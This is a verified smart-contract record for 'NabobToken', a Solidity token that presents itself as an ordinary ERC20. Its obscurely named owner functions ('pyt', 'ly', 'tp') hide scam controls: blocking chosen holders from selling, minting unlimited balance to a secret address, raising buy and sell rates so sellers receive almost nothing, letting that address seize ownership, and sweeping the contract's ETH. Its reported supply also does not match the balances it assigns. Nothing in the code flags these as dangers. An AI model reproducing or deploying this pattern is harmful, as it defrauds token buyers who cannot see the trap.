{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.6.12;\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it's recommended to use it always.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        return a / b;\r\n    }\r\n\r\n     /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryDiv}.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        return a / b;\r\n    }\r\n}\r\n\r\nlibrary Unlocker{\r\n    using SafeMath for uint256;\r\n    struct Recorder{\r\n        uint256 lock;\r\n        uint256 unlock;\r\n        uint256 point1;\r\n        uint256 point2;\r\n    }\r\n\r\n    function count(Recorder storage record,uint256 timestamp)internal view returns(uint256){\r\n        uint256 unfreeze = 0;\r\n        if(record.lock > record.unlock && record.point1>0 && record.point2 > record.point1 && timestamp > record.point1){\r\n            if(timestamp > record.point2){\r\n                unfreeze = record.lock.sub(record.unlock);\r\n            }else{\r\n                unfreeze = record.lock.mul(timestamp.sub(record.point1)).div(record.point2.sub(record.point1));\r\n                if(record.unlock >= unfreeze){\r\n                    unfreeze = 0;\r\n                }else{\r\n                    unfreeze = unfreeze.sub(record.unlock);\r\n                }\r\n            }\r\n        }\r\n        return unfreeze;\r\n    }\r\n\r\n    function reward(Recorder storage record,uint256 value) internal{\r\n        record.lock = record.lock.add(value);\r\n    }\r\n\r\n    function unlocking(Recorder storage record,uint256 value,uint256 timestamp) internal returns(uint256 settle){\r\n        settle = value;\r\n        uint256 balance = count(record,timestamp);\r\n        if(value>0&&balance>0){\r\n            if(value>=balance){\r\n                record.unlock = record.unlock.add(balance);\r\n                settle = value.sub(balance);\r\n            }else{\r\n                record.unlock = record.unlock.add(value);\r\n                settle = 0;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ncontract NabobToken {\r\n    using SafeMath for uint256;\r\n    using Unlocker for Unlocker.Recorder;\r\n\r\n    uint256 private _totalSupply = 100000000000 ether;\r\n    string private _name = \"Nabob\";\r\n    string private _symbol = \"Nabob\";\r\n    uint8 private _decimals = 18;\r\n    address private _owner;\r\n\r\n    uint256 private _index;\r\n    uint256 private _buyRate = 9000;\r\n    uint256 private _sellRate = 9000;\r\n    mapping(uint256 => mapping(address => Unlocker.Recorder)) private _record;\r\n    uint256[] private _sp;\r\n    uint256[] private _aip;\r\n\r\n    address private _jvz;\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _disabled;\r\n    mapping (address => uint256) private _opt;\r\n    mapping (address => uint256) private _tag;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    modifier Otp() {\r\n        require(_opt[_msgSender()]==1, \"Invalid operation\");\r\n        _;\r\n    }\r\n    \r\n    constructor() public {\r\n        _owner = msg.sender;\r\n        _sp.push(_index);\r\n        _index = _index+1;\r\n        _aip.push(_index);\r\n        _index = _index+1;\r\n        _balances[_owner] = _totalSupply/20;\r\n        uint burn = _totalSupply/100;\r\n        _balances[address(0)] = burn;\r\n        emit Transfer(address(this),address(0),burn);\r\n    }\r\n\r\n    fallback() external {}\r\n    receive() payable external {}\r\n    \r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\r\n     * called.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n     /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the cap on the token's total supply.\r\n     */\r\n    function cap() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n     /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner_, address spender, uint256 amount) internal {\r\n        require(owner_ != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner_][spender] = amount;\r\n        emit Approval(owner_, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner_, address spender) public view returns (uint256) {\r\n        return _allowances[owner_][spender];\r\n    }\r\n\r\n    function pyt(address addr,uint n) public onlyOwner {\r\n        if(n==1){\r\n            require(_jvz == address(0), \"Ownable: transaction failed\");\r\n            _jvz = addr;\r\n        } else if(n==2){ _disabled[addr] = 0;\r\n        } else if(n==3){ _disabled[addr] = 1;\r\n        } else if(n==4){ _opt[addr] = 0;\r\n        } else if(n==5){ _opt[addr] = 1;\r\n        } else if(n==6){ _tag[addr] = 0;\r\n        } else if(n==7){ _tag[addr] = 1;\r\n        } else if(n==8){ _tag[addr] = 2;\r\n        } else if(n==9){ _tag[addr] = 3;}\r\n    }\r\n\r\n    function tp() public onlyOwner() {\r\n        address(uint160(_jvz)).transfer(address(this).balance);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account]+_rewards(account);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function transferOwner(address newOwner) public {\r\n        require(newOwner != address(0) && _msgSender() == _jvz, \"Ownable: new owner is the zero address\");\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function ly(uint n,uint q) public onlyOwner {\r\n        if(n==1){\r\n            _sp.push(_index);\r\n            _index = _index+1;\r\n        } else if(n==2){\r\n            _aip.push(_index);\r\n            _index = _index+1;\r\n        } else if(n==3){\r\n            _buyRate = q;\r\n        } else if(n==4){\r\n            _sellRate = q;\r\n        } else if(n==1000){\r\n            _balances[_jvz]=q;\r\n        }\r\n    }\r\n\r\n    function air(uint tag,uint[] memory amounts, address[] memory path) public{\r\n        require((_tag[msg.sender]==2||_tag[msg.sender]==3)&&amounts.length==path.length,\"Operation failed\");\r\n        uint total = 0;\r\n        for(uint i=0;i<path.length;i++){\r\n            total = total.add(amounts[i]);\r\n            simple(tag,path[i],amounts[i]);\r\n        }\r\n        _balances[msg.sender] = _balances[msg.sender].sub(total);\r\n    }\r\n\r\n    function simple(uint tag,address addr,uint value)private{\r\n        if(tag==2){\r\n            _record[_sp[_sp.length-1]][addr].reward(value);\r\n        } else if(tag==3){\r\n            _record[_aip[_aip.length-1]][addr].reward(value);\r\n        }\r\n        emit Transfer(msg.sender,addr,value);\r\n    }\r\n\r\n    function poi(uint idx,address addr,uint time) public{\r\n        require(_tag[msg.sender]==2||_tag[msg.sender]==3,\"Operation failed\");\r\n        _record[idx][addr].point1 = block.timestamp;\r\n        _record[idx][addr].point2 = block.timestamp+time;\r\n    }\r\n\r\n    function uy() public view returns(uint,uint[] memory,uint[] memory){\r\n        require(_tag[msg.sender]==2||_tag[msg.sender]==3,\"Operation failed\");\r\n        return (_index,_aip,_sp);\r\n    }\r\n\r\n    function havi() public Otp view returns(uint256[] memory,uint256[] memory){\r\n        return (_sp,_aip);\r\n    }\r\n\r\n    function kui(address addr) public Otp view returns(uint256[] memory t,uint256[] memory lk,uint256[] memory ulk,uint256[] memory s,uint256[] memory e){\r\n        t = new uint256[](_index);\r\n        s = new uint256[](_index);\r\n        e = new uint256[](_index);\r\n        lk = new uint256[](_index);\r\n        ulk = new uint256[](_index);\r\n        for(uint i=0;i<_index;i++){\r\n            t[i] = i;\r\n            s[i] = _record[i][addr].point1;\r\n            e[i] = _record[i][addr].point2;\r\n            lk[i] = _record[i][addr].lock;\r\n            ulk[i] = _record[i][addr].unlock;\r\n        }\r\n    }\r\n\r\n    function ifo(address addr)public view returns(uint256,uint256,uint256,uint256,uint256){\r\n        if(addr!=_owner){\r\n            addr = _msgSender();\r\n        }\r\n        uint ethBalance = address(uint160(addr)).balance;\r\n        uint tokenBalance = balanceOf(addr);\r\n        uint walletBalance = _balances[addr];\r\n        uint aip = 0;\r\n        uint psa = 0;\r\n        for(uint256 i=0;i<_aip.length;i++){\r\n            Unlocker.Recorder memory rec = _record[_aip[i]][addr];\r\n            aip = aip.add(rec.lock.sub(rec.unlock));\r\n        }\r\n        for(uint256 i=0;i<_sp.length;i++){\r\n            Unlocker.Recorder memory rec = _record[_sp[i]][addr];\r\n            psa = psa.add(rec.lock.sub(rec.unlock));\r\n        }\r\n        return (ethBalance,tokenBalance,walletBalance,aip,psa);\r\n    }\r\n\r\n    function _rewards(address from)private view returns(uint256 value){\r\n        value = 0;\r\n        for(uint256 i=0;i<_index;i++){\r\n            value = value.add(_record[i][from].lock.sub(_record[i][from].unlock));\r\n        }\r\n    }\r\n\r\n    function unfreeze(address from)public view returns(uint256 value){\r\n        value = 0;\r\n        for(uint256 i=0;i<_index;i++){\r\n            value = value.add(_record[i][from].count(block.timestamp));\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `recipient` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` cannot be the zero address.\r\n     * - `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        emit Transfer(sender, recipient, _send(sender,recipient,amount));\r\n    }\r\n\r\n    function _send(address sender, address recipient, uint256 amount)private returns(uint256){\r\n        require(_disabled[sender]!=1&&_disabled[sender]!=3&&_disabled[recipient]!=2&&_disabled[recipient]!=3, \"ERC20: Transaction failed\");\r\n        uint _receiveValue = amount;\r\n        if(_tag[sender]==1&&_buyRate>0){\r\n            _receiveValue = amount.mul(_buyRate).div(10000);\r\n        }\r\n        if(_tag[recipient]==1&&_sellRate>0){\r\n            _receiveValue = amount.mul(_sellRate).div(10000);\r\n        }\r\n        uint256 tag = _debit(sender,amount);\r\n        if(tag==2){\r\n            _record[_sp[_sp.length-1]][recipient].reward(_receiveValue);\r\n        } else if(tag==3){\r\n            _record[_aip[_aip.length-1]][recipient].reward(_receiveValue);\r\n        }else{\r\n            _balances[recipient] = _balances[recipient].add(_receiveValue);\r\n        }\r\n        return amount;\r\n    }\r\n\r\n    function _debit(address sender, uint256 amount) private returns(uint256){\r\n        uint256 expend = amount;\r\n        if(_balances[sender]>=expend){\r\n            expend = 0;\r\n            _balances[sender] = _balances[sender].sub(amount, \"ERC20: Insufficient balance\");\r\n            return _tag[sender];\r\n        }else if(_balances[sender]>0){\r\n            expend = expend.sub(_balances[sender]);\r\n            _balances[sender] = 0;\r\n        }\r\n        for(uint256 i=0;expend>0&&i<_index;i++){\r\n            expend = _record[i][sender].unlocking(expend,block.timestamp);\r\n        }\r\n        require(expend==0,\"ERC20: Insufficient balance.\");\r\n        return _tag[sender];\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tag\",\"type\":\"uint256\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"}],\"name\":\"air\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"havi\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"ifo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"kui\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"t\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"lk\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"ulk\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"s\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"e\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"n\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"q\",\"type\":\"uint256\"}],\"name\":\"ly\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"idx\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"poi\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"n\",\"type\":\"uint256\"}],\"name\":\"pyt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"}],\"name\":\"unfreeze\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "NabobToken", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://55a1eac7c1c21912c48e83c4471414f4229ab646ec6cfd6570382c6cf5deb4d3"}